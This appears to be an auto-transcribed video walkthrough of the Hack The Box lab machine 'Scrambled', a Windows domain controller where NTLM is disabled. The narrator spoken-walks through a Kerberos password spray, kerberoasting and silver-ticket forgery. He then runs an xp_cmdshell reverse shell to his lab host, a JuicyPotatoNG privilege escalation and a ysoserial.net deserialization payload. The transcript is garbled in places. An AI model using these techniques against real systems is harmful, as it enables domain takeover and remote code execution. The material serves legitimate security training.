 what's going on YouTube this is ipsec we're doing scrambled from hack the box and I really like this box for two main reasons the first one being the author had intentionally disabled ntlm and if it was left enabled the box would be a lot simpler because your tools would just magically work so it poison you use like Kerberos authentication I thought was a really cool twist the second thing is there's two different paths to administrator that are both really cool the first one is gonna be taking advantage of potato and we're going to use the new potato attack that is like two weeks ago because it is so much easier to use than Rogue potato and I think Road potato has patched on latest windows so this one now will always work if you have SE impersonate at least until Microsoft changes something again so I love that path because hey the potato attacks is so cool the second one involves getting a thick client and discovering it does some desolization and using yso cereal.net to get code execution so with that being said let's just jump in as always we start off with the end map so Dash SC for default scripts as the enumerate versions OA output all formats playing the nmap directory and call it scrambled and then the IP address of 10 10 11.168 this can take some time to run so I've already ran it looking at the results we see 13 ports open the first one is DNS on Port 53 and its version says simple DNS plus which sounds fishy but really that's the standard thing you see on Windows domain controllers we can scroll down see Kerberos is also here with ldap and ldap S so it's definitely going to be a domain controller it is leaking the hostname of dc1.scrm.local so we have both the hostname of the domain controller and the domain itself so let's add that before we forget pseudo VI Etsy host and we can do 10 10 11 168 and then put both of those in our host file okay we also have a web server on Port 80. it's running on IIs httpd version 10.0 so we can get an idea this is a recent version of Windows just based upon the 10.0 header um you used to be able to get like the exact version of Windows but Microsoft stopped updating this as often as they used to so all we know is it's relatively recent and there's not much else we get from this I guess there is a Microsoft SQL Server running so if we ever have type of like SQL injection we should try like XP CMD shell to get a shell on the box and things like that um we also get the time and how far off our clock is and this would be important if we end up doing anything Kerberos related because Kerberos is heavily influenced by the clock I want to say you can't be more than like five minutes off I forget exactly how far you can be off but um that is important information potentially so let's just go take a look at the server itself 10 10 11 168 and we get a web page this is the scramble Corp intranet site and it just shows some stats of it we have a few links up here the first thing I'm going to do is like try index.php which probably doesn't exist because it's a Windows server on IIs we can try aspx and ASP those are common extensions HTML and this is an HTML page so um I'm not sure what I clicked to get there let's see reports I guess your home and reports is pretty much the same thing um reports probably just brings you down to there so on the IT services page we do have an alert that says due to security breach last month we have now disabled all ntlm authentication on our Network so if we tried to do something like list shares it's probably going to fail right away because the default is ntlm so SMB client slash l or Dash elderly shares and scrm.local we can also specify the DC if we wanted to it doesn't matter because all we needed was the IP address and then we try any authentication and we don't get log and failure we just get status not supported because it's doing an ntlm authentication so um whenever we do authentication against the box we have to focus on Kerberos there are some resources so contacting it support new account form report a problem and request password reset so let's take a look at all the pages we have an internal number so if we ever see anything on a phone we should probably dial 0866 to reach the it support line um we have a potential username here support and it also looks like we have another one k Simpson so I'm just going to add a users.txt and we can say support K Simpson and start building that out long we could also copy this image link and see when it was created or at least added to the server so I'm going to do a w get on it and we can do a zip tool uh except tool on the image name and if we look up at all the metadata we do see a file modification date time is 2021 of November I'm guessing this is the month so I was like drawing a blank because when I see these colons I think time but nope this is the date separator so November 4th 2021 is when this was added so if we're trying to guess something based upon a password based upon the date I would start from that date probably we also have the author's name VB scrub as the artist and author so we should add VB scrub into or use the dot text just because we did find him there so the next thing we can look at is the next page and we have a new user account form so let's just add ipsec ipsec uh ipsec and we'll send everything we can view this request when we send it to see exactly what happens um I guess nothing really we probably should have put some type of like cross-site scripting thing here and seen it reach back to us but I don't think this form actually does anything so we're just going to ignore it this next page of the sales order is or at least has some information about it it's leaking the name again here we see dc1.scrm.local and it's also talking about a debug feature so this may just be a different way to log into Kerberos we don't know exactly what this application is yet but we should take note of it and again we can copy the image link and download it to see again when this was uploaded so exif tool orders1.png so we know this tool was created at least in November 4th um it could have been created before because again we just have a screenshot to go off of but we know the app existed at least about a year ago next thing is a page on password resets it says or self-service password reset system will be up and running soon but in the meantime please contact the support line to reset the password if no one is available leave a message stating your username and your password be set the same as the username so this is like a hint at password spring I'm guessing we have three potential users that we logged we have support K Simpson and VB scrub so we want to do a password spray here and I'm going to use curb root because this is a great Kerberos um brute forcing toolkit and since it's Kerberos it's gonna work even though ntlm is disabled if I just tried my standard way um it wouldn't work I'm sure crack map exec does have something to do this but whenever doing this I've always just defaulted to curb root so let's download this and then we'll move it into a directory to curb root make it executable and then the first thing we want to do is a user enum to validate valid users so I'm going to do dot slash curb root user Anum Dash H to get helps we want the domain scrm dot local and then we just want the username word list which is users.txt I can't find any kdcs for that realm I wonder if we specify dash dash DC dc1.scrm.local and it works we see we tested three usernames and got a valid one of K Simpson so the next thing is a password spray with the password of K Simpson because the help desk says it's going to set the password to be the same as the username so curb root now with password spray and then we can do Dash H to look at the options and see it's pretty much the same thing so DC dc1.scrm.local um Dash D for domain scrm dot local and then the user file which is users.txt and the password which will be K Simpson and we get a valid login so at this point we know K Simpson's login information but we're gonna have trouble logging in because if we do like SMB client Dash UK Simpson Dash L and then dc1 dot scrm dot local put in the password of K Simpson again it's status not supported because um it needs Kerberos login we can try like putting the domain here I think yep that works okay Simpson and still not supported so the easiest way to do this now is through impact it and I'm going to use impack it from the um repo whenever doing like cobra stuff I do like a git pull on impacket and then just do everything from the example scripts so the first one we want to use is get TGT this is going to get a ticket granting ticket and this ticket just authenticates against the DC and it's used to then go back to the DC to get a TGs when we want to get actual services so think of like you're going to a movie theater and you use Fandango to buy the ticket online the TGT is a coupon code for Fandango that tells you you can buy one movie ticket of anything it doesn't really have any much information about it but it just says you're authorized to buy movies so if you went to the movie theater with your TGT they're going to be like um we don't accept Fandango here right so you have to use that coupon code to Fandango to get a TGs a ticket granting session or service it's a TGs ticket that would movie theater would accept so the first step is getting a TGT so we're going to do um get TGT and then I think it's just seo-m.local slash K Simpson and then colon the password which is K Simpson and we see it saved the ticket to ksimpson.cash so now if we export the variable name Kirby five CC name and give it the ticket name which is the username.cc cache we'll be able to use this ticket so if I do k-list we see the file here the default principle and how long it's good for now by default it's always going to be good for 10 hours on a domain controller because that's the default Max lifetime you can shrink or expand that time if you want um and if it expires you just have to get a new ticket but we can use this one for 10 hours so the next step here is to do a different impacted script against this and generally whenever I have authentication the first thing I look at is the user spns this is known as like kerberosting the server to see if there's any spns here so we can do that and then specify sem.local ksimpson and then the DC IP will have to specify in this in packet script we can just put the domain there and then Dash K the dash K tells it to use kubrows um I guess it wants us to do the password as well I thought it would just use the ticket and let's see getting machine hostname a quest is not supported trying with the net bios name what if I add no pass let's see I don't know exactly why this is happening dc1.scrm.local it should be using cobras I don't know why it's saying SMB and this is why I went into and pack it and pulled the latest before running it um if I don't do dcip that's weird oh um I'm using dcip and it wants DC host I'm guessing that's going to be the issue so let's copy this again paste it and change it to dc-host whenever you're doing something Kerberos related you always want to use host not IPS I didn't realize impact it had two different options for them but now looks like it works and the reason for that is it uses the hostname to identify if it should use the Kerberos ticket so I guess in in packet since I specified dc-ip it translated this hostname to an IP address and then saved it as that and didn't keep the hostname around so it didn't know to use cobras to do this login even though we told it to which is weird but what do you expect from a hackery tool right so we have a SPN so I'm just going to do the dash request so we can get a hash for this and then we'll give it over to hashcat so we can crack it so I'm going to copy this and then go over to the Kraken and then go into hashcat V hashes and we can call this scramble dot out and then we can just specify hashcat if I can spell it correctly put the hash file in and then the word list and in latest versions of hashcat it will automatically detect the hash and since the format of this if we looked at it does have information about it hashtag can easily detect this and do the mode for us so now the next step just to view what the password was we can just do dash dash show and we can see the password for this is Pegasus 60. so we have the credentials to uh what hash did we get I'm just going to run this command again and we can scroll up it's going to be um let's see V credits.txt we have K Simpson K Simpson and then also let's see this is going to be SQL SVC Pegasus 60 and that is also going to be the MS SQL service dc1.scrm.local SPN right so we can refer to that through either of these formats and after seeing that Ms SQL I'm now remembering that there is a SQL server on this box right so we should test logging in and I did exit there to get back to my original pane because if I look at EnV I should have a kb5cc name here of ksimpson.cash so we can log in and in packet does have a um Ms SQL client so we can do Ms SQL client dot pi and then just specify dc1.scrm.local and dash k for kubrows and we see it's going to be authenticating and we'll see if it does end up all thing it looks like login failed for scrmk Simpson so I'm going to rename this pane to be K Simpson and we're going to create a different Pane and this will be um let's see we'll call this SQL SVC and I'm just doing this because of the environment variables and it gets confusing if I don't right so let's do opt and packet examples python3 [Music] um it was get TGT right let's see I always hate the casing Python 3 get TGT dot pi and then scrm dot local slash SQL SVC Pegasus 60. and it saved the cache there so we can do export krb 5 CC name is equal to SQL svc.cc cash and we can do Python 3 Ms SQL client dot Pi dz1.scrm.local Dash K and now we're logging in with the SQL service so encryption required and that's odd it failed for the login I expected that to work however it is Ms SQL that is vulnerable to server tickets and we can forge a silver ticket because we do have the hash of this SPN um the tickets itself are always going to be encrypted with a ntlm so that's why we have to get the ntlm hash of this and to do that I'm just going to Google um ntlm generator foreign let's see cat creds dot text Pegasus 60. put this here and we can copy this I'm not sure if it's case sensitive or not um I'm gonna do lowercase lowercase let's do cyber chef I want a cyber Chef has a two ntlm option no to lowercase okay so let's go back to creds I want to add another note of the ntlm hash because we need that the other thing that we need that we have not got yet is going to be the domains um Sid and the easiest way to pull this is getting a user Sid because the domain Sid is the prefix to a user Sid and the get pack script is actually going to do this and we just have to do a targeted user so we can do Target user and we'll specify administrator and then our credentials or a ticket so K uh sem.local ksimpson K Simpson and we can get the domain said this way um where is the user said it should be somewhere in here uh it's gonna be Dash 500 so the user said will be the domain said Dash 500 but don't actually need it let's see let's go back here I'm just going to put this in our creds because we'll need this file eventually I did want to show the ldap way so if you did ldap search Dash 8 for host and it's Capital H it's a weird syntax then dc1.sum.local Dash UK Simpson and then this is sem.local so DC equals scrm DC equals local it's a weird way that ldap puts at some structures and we can dump odap this way and if I grep for Sid let's put the password back in we can see a bunch of Sids here if I um Echo dash n this said it's gonna be in a weird format um and I believe Microsoft calls that the binary format and we want to convert that to the string format so I'm going to Google Sid binary to string python and let's see this first stack Overflow is probably good if you go to this Dev blog page if it lets me click come on let's just hold Ctrl and click this is going to talk about exactly how it's formatted so you just need to unpack each of these but that would probably take 10 to 15 minutes to write it's easier to just copy and paste right um and I guess it's not a Microsoft thing it's an ldap thing on how to format Sid but let's just create a new thing let's call this to Sid dot pi and paste this in and it doesn't look like this is doing any base64d coding so we're gonna have to do that so import base64 and then I'm also going to import sys so we can grab an argument and we're going to say Sid is equal to syst.urg V1 and I'm going to call this Sid or we do b64 Sid like that and Sid is equal to base64.b64d code b64 Sid that's a lot of b64s and now we can just print convert Sid and if we do python3 to Sid dot pi and grab the base64 that we have we get a full set and if I take what I believe is a domain because this is the user ID or group ID whatever ID it is 1604 we should match on what's in our credential file and we do the domain said right if we wanted to see what that is we could copy this um let's see go back here let's do less okay Simpson search for this whole thing and this is going to be the user or Smith right so Robert Smith and ldap but that's a long way to go about we have the domain Sid two different ways and now what we want to do is create a ticket or Forge a ticket Forge a TGs ticket and again the reason we can do that is the let's go back into a creds file the SPN this this hash is how um the encryption key to tickets like I said before everything in Kerberos is always going to be encrypted or signed with the ntlm hash right and if we wanted to create a silver ticket for a computer we'd have to have that computers ntlm hash we don't have to know the computers ntlm hash for Ms SQL because it created this SPN their service principal name is what I believe means so this is why we'll be able to forge information and take it just because we know this one piece so let's go back to this and I'm going to run python3 I'm going to do ticketer.pi and if we looked at the source code to this it explains exactly what it does so it creates tdt TGs based upon a format tells you how to use it so if you have questions I would actually just read that um comment block so let's do ticketer.pi and then what we need is the SPN so I'm going to get the SPN from a creds so this is going to be the SPN and then the next thing we need is the user ID that we want to put on the ticket and I'm going to do 500 because we know that one to be the default administrator our ID 500 is always going to be administrator um we give it the name so administrator and then NP hash this is going to be the encryption key for the ticket which is the ntlm that we kept talking about so we can copy and paste that and then the next piece we need is the domain Sid because the domain set goes in the curb Rose ticket again we are forging this information which is why we have to put everything in um and then domain is scrm.local so I think we have created this and it saved to administrator.cc Cache so let's rename this session so this will be administrator and let's go um opt and packet examples export krb5cc name is equal to administrator.cc Cache right that's where the ticket is it is and if we do okay list we can see something really fishy um the ticket expires in 10 years I don't know a way in like domain controllers to log when this happens I think Microsoft ATA the advanced threat analytics automatically will hook it and see it but the main control is going to accept this this ticket should never ever exist because the max age is 10 hours and impact it memicats Etc like to set it for 10 years um just one of those things tools do that make it somewhat easy to detect you would think would be easier to detect than it actually is um because I don't know a good way to detect this I'm I bet if you use like Zeke and did some packet analytics if this gets passed in clear text you would see it but in the event log for domain controller it never says the ticket expiration time and I don't know how to get that information out but long way long story short we have a ticket that says we are administrator so now let's run our MS SQL client and we can say dc1.scrm.local specify Dash k for Kerberos and we're in right so we could just run any SQL command now the first thing I always like doing is XP CMD shell so if we just do xbcmd shell who am I we see the component is turned off but you know what we are administrator so I can just run this enable XP CMD shell and run it again and we have SQL service so now the next step is to get a reverse shell so let's use nishang so I think it's in um CD user share nashang and then shells yep so I'm going to CP this and we want the TCP one line.ps1 I'm just going to copy it to rev.ps1 and we just edit it slightly so take the first two comments out take the last two and I don't know if Defenders on this box or not if it is amsi is going to block this and want to edit it slightly if it's not then we'll golden right so 10 10 14 8. 9001 and that's all the editing we have to do now we could put this on a web server and download it but um it's always a pain because we'll have to deal with a lot of quotation marks so what I'm going to do is just cut this and then convert it to a Powershell base64. so icon to convert the target format utf-16 little endian and all this does is just change how it's printed right so if I just look at this in the terminal it looks the same but if I X XD it you can see everything now is two bytes right if I take that out in xxd that's what it looks like so this is how Windows likes doing it and we can now just base64-w0 to get rid of line wrapping and then copy this and then NC lvnp 9001 and for this xbcmd shell we can just do Powershell Dash ENC and paste this and the ENC stands for encoded command so now we have a shell on this box and the first thing I always like doing is who am I slash priv and we can see we have the SE impersonate privilege because we came from a Windows service so since we have SE impersonate that means we can probably do a potato style attack now Rogue potato would work on this Rook potato is a bit harder to use however um there is a new potato attack that just came out a few weeks ago I think and we're going to use that one because it's a lot easier and Rogue potato is um patched on the like newest versions of Windows right stop clicking there we go oh my God I just want to go to decoder's website because he's the one that puts all the potato news out there and is one of the main creators he did have help as he's talking about here Splinter code did help him um all we want to do is get to his GitHub page if you want to know how it works you can read his blog post but source code is here and he also has a release so we can just download this zip file and let us copy it so move downloads juicypotatong.zip here make directory dub dub dub cdww and we'll unzip that file in this directory and we do have an exe so python3 Dash M HTTP server and then let's go in program data and we just want to download this so curl 10 10 14 8 8 000 juicy potato and g dot exe Dash oaf out file I'm just going to call this JP to make it easy so I have to type that again and we do have it downloaded if I execute it we have some options right and the easiest way I've ever found to use this is just to um create a bat file so if I go in www V T dot bat actually let's do that I convert command again and we're going to put that file in t.bat and windows if you just like open a bat file it's automatically going to execute if you just open a Powershell file it's not so that's why we create this in a bat file so have that there and then go back to our prompt let's nclvnp 9001 and let's execute jp.exe Dash T I'm going to do start to try booth and Dash p actually we have to download it curl 10 10 14 8 8000 rev Dot what I call it Teo Rev D dot bat teed up at Dash o t dot bat we downloaded it so now dot slash jp.exe t-star the program I want to Launch is um C colon backslash program data t.bat so that's exploit successful and we got a shell so if I do who am I we're anti-authority systems so users administrator desktop and we could get root.txt so this was actually an unintended way to do this um I don't think we're supposed to enable XP CMD shell and execute commands so if we didn't do that we wouldn't have um the SCM personate privilege which breaks the potato so let's go back take a few steps back and do this the intended way which is to enumerate the database and since this is Ms SQL we can't just do like show databases because it doesn't have that command instead we do select name from sys.databases and we can list all the databases that way if you want a primer on Ms SQL I'd recommend the stream IO video where we actually look at Ms stocks and see how to explain all of this but if we want to get the table names we can just do select table name from scramble HR dot information schema dot tables and we can see there are three different tables so if we want to dump all this information we can just do select star from and then scramble HR and we could do just dot dot employees I think we can do can we do one dot or do we need two we need two dots because there is a middleman between this and that is dbo by default so that's the same exact thing and there's no employees in this so let's do user import and we see there is ldap user misc service and ldap password scrambled eggs9900 so we got another credential so let's V credits.txt and I'm going to do misc SVC paste in the password and I'm just going to say it came from scramble HR database and generally how I organize my creds.txt I go user password notes so K Simpson was a PW spray but um yeah so let's try Evo winner M so evil winner m scrm dot local we can do Dash I then Dash U misc SVC Dash p scrambled eggs and we have some error message let's see ping scrm dot local let's do 10 10 11 168. and we're getting error messages was that the same error both times two one six yep well I don't know what that number is because it's too high to be like a Windows error code H result so um I'm just going to do evil win RM Dash H for help to see if it even supports Kerberos and it looks like it does so we need to set the caribbe 5 and it has gotta be something like this so let's do sudo VI Etsy krb5.com and then I wonder if I have to where do I set this probably under realms so it's not gonna be contesso.com it's going to be uh what was that cat Etsy hosts scrm so s c r m dot local is equal to dc1.scrm.local I'm guessing that is set correctly we can put this in the correct format so I think that's how the file wants it and I'm going to get rid of that line I guess we can do all these scrm dot local and the domain realm we'll do it again actually percent s realcorp.htb scrm dot local G same thing with caps okay B file is fixed so now we probably want to um go into it and pack it and get a ticket so we gotta get the TGT scrambled creds python three get TGT lowercase I think and then scrm dot local slash misc service scrambled eggs 9900 okay export krb 5cc name is equal to misc SVC dot cache like that and let's do evil when rm-h so Dash r let's see realm scrm dot local Dash I 10 let's just do sum.local there and let's see server not found in Kerberos database there we go we need the hostname not the domain there but now we have Eva winner M session established to this box so we look at documents nothing there do a dir go on to desktop and we have user.txt so I think if we looked at like the home let's see there is a temp SQL and temp is unique nothing is there there is a shares so if I go into shares we have a few directories so let's do ID and if we go into it there's apps logs and reports so dir apps sales order client sales order client it's probably gonna be in quotes CD apps if we look at it we have the scrambleclient.exe and scramble lib.dll so let's download both of these so scrambleclient.exe and the next thing we'll do is download this okay we can look at logs nothing in there reports nothing in there we can look at HR permission denied production denied public network security changes sales nothing I'm guessing the network security changes is a notice about disabling ntlm off um I guess we could download it I wonder if we're supposed to get that somehow I've never looked at this file before but no reason we can't download it right so now let's open up places so we can download this file so htb uh what is this scrambled then we want to look at this PDF right um probably downloaded everything into the impact directory which is annoying CD user share oh no opt and packet examples move let's see network security changes to hdb scrambled and let's also move star.exe star.dll okay so now we can look at this PDF and they're talking about disabling ntlm using Kerberos Authentication so yeah not too much information there we could exif tool this PDF so doing that and it doesn't reveal who the author is we see it was created in Microsoft Word 2010 but no author date so nothing really useful there um if we look at the scrambleclient.exe we see it is.net so we probably should load this up in a Windows computer so we can do dnspy to decompile it so let's copy this and then go over to a Windows VM and paste it so now we have the application on our windows but the issue we're going to have is it wants to log in and we can't um we could just open up in dnspy and poke around but we should have this working first so let us go and turn our Linux computer into a router we could also just run openvpn on the Windows computer but then we'd have to keep playing the game of Disconnect from Linux to open on Windows and vice versa and I don't like doing that so I'm going to check if ip40 is enabled on my box and we see ip4 is set to 1. um if it wasn't then I'd Echo one into um pseudo Echo one into Praxis matte ipv4 IP forward to enable it but since 31 don't have to do that and then I create the IP tables rules so we create one in the Ford table for ton zero and I'll put it to eat zero and before I do that um I just want to make sure it is indeed eth0 and not like ens 190 or whatever so it is e0 specify the state to be related or established and accept iptables Dash a forward pseudo iptables Dash a forward and then we just reverse it so input e0 output ton zero accept and then pseudo iptables Dash T Nat a first routing the source address and my source network is 192.168.5080 you're probably gonna be 1.0 because that's what most people are but that's your home network so put that address ton 0-j and then if I can spell masquerade correctly that should be good and if you're curious all those commands um let's see I know I explained it so let's do iptables windows Windows Linux router there we go so the shut video is where I explain what I did so let's see that is set up we can go on Windows let's open an elevated command prompt and when I did that I did CMD then Ctrl shift enter to go elevated if I don't hit Ctrl shift enter it goes as my user we can see ipsec is here and in this one it is system so I can do a route add 10 10 10 10 0 mask 255-255-2540 and 192 168.58 I want to say my Linux box is 230. see it is 230. okay and I should be able to paying 10 10 10 10 1. do a two yeah two is the Gateway I think so 10 10 11 168 I was the box I believe and we can ping it so now let's go into notepad Ctrl shift enter again and I want to open the host file and we're going to copy the line from a Linux and put it into our windows so now the DNS will resolve correctly save yep and the server it's going to use port 4411 which it probably just didn't come up in nmap because it's not default but if we do 10 10 11 168 4411 we get connected and anything we put here we're getting unknown command so um yeah let's just put the server dc1 Dot uh what is it scrm.local I'm going to click enable debug logging because why not and then the username I'm going to put what K Simpson K Simpson we click sign in and we got invalid username and password and also a log file and it's invalid credentials so we could try going over to parrot we can cat creds.txt we can try this credential so copy um misc SVC that doesn't look like it copied right did it oh no that looks right invalid username and password so what we could do is Wireshark and intercept the request to see what's happening I'm going to guess it's trying ntlm authentication and this application is broke invalid username and password let's follow the Stream so it just tries log on and then this is how it does it and the service says invalid credentials so that doesn't really help us maybe there's a hint in the source code so let's open DNS by and decompile the dll most likely as where the functions that we want to ER the nspy is opening file open and let's see I think it's on my desktop and then scrambled lib Okay so looking at this it looks like it's just talking about the debug log I don't see the login function yet so let's look at sales order doesn't look like there's too much here there is a binary formatter which may become helpful later let's look at net client we get log on and we can see how it logs in and if it is scrm dev then there's a login bypass so let us try opening the application again and then just putting sem Dev as the username and we get logged in so we can see two orders we can create a new order as well we should make sure enable debug logging is clicked and then let's create a new order order reference let's do 9001 due date let's do tomorrow one the cost is 13.37 and we worked with our good hand we click upload and the order was sent to the server and I don't see anything here I'm going to log out and log in and if we look here nothing was created if we look at the debug log we can see um it uploading this is all of us like failing to log in but we see binary formatter initialization and then we order serialize to base64 and I'm guessing this is or order oh no we serialized it and here's the command it is sending to the server so upload order a a d and the rest of that is base64. I think I still have Wireshark running Maybe I do so if we scroll all the way down to the last TCP stream I'm guessing we can see it um maybe not that stream that was weird um let's see let's go back see four four one one we're on that follow this and here we see oh it list orders and it's sending it base64. so let's try TCP stream equals three and maybe this is us uploading so it looks like all of the orders get serialized in base64. now I bet if we on base64 it's going to be a confusing blob because serialization languages are confusing um but we can see the general idea we got a sales rep it's probably putting an integer or something here if we put it to xxd let's see we see 9001 that was what we put there there's probably one three three seven somewhere that was the price but the data is not important the fact that is doing serialization is what is important here and we know that it's using the um binary formatter so the next step is to try to build a malicious base64 object and then upload the order and see what happens when the server processes it so let's open up Firefox and then download yso serial.net so we can build a malicious uh deserialization payload so I'm just going to Google yso serial.net GitHub and I don't know which one to download I'm going to guess the one off pen testers repo looking at it 22 days ago it's probably fun not the thing to normally say when downloading attack tools right but um it is off of GitHub so hopefully it's safe so let's open up release we do have a y2co.exe so I'm just going to extract this and we will play with it so CMD CD downloads yso serial release serial.exe and let's see we want to use the format of binary formatter and these are all the gadgets we can use so we can look at the gadget see it has binary formatter I'm going to use Windows identity because it does support this so let's see why so serial Dash F I wonder if I just do binary formatter if it then tells me gadgets I don't think so I don't use weisserial.net that much so we'll specify Dash G windows identity and then we want to change the output format to base64 because we want a base64 object if we just do raw it's going to produce a lot of like not printable characters you do that if you're uploading like you want to create a file but since we just want to copy and paste it into a tonet session we definitely want base64. and then the command we're going to run uh we already dropped the malicious.bat file on the box as C colon program data t.bat I believe so I'm just going to execute that because that's a reverse shell um I'm not sure if we have to put cmd.exe to execute it so we'll just try this one first and we get the base64 object we can copy this and then I'm going to look at the debug because this is what ncat is doing so it's just doing upload order and then the base64 object so I'm just going to copy how it does it and then copy this text go back over to our parrot let's paste to make sure it looks good and we do a um netcat let's see first yeah let's listen on 9001 and I think it was Port 4411 it talked to so 10 10 11 168 4411 yep put this base64 object in and error deserialization exception has been thrown by the Target of an invocation but we have a session and it's system so we got an error but um I'm guessing the air is fine because we're here as administrator and we could also go into the desktop and get root.text so hope you guys enjoyed the Bucks take care and I will see you all next time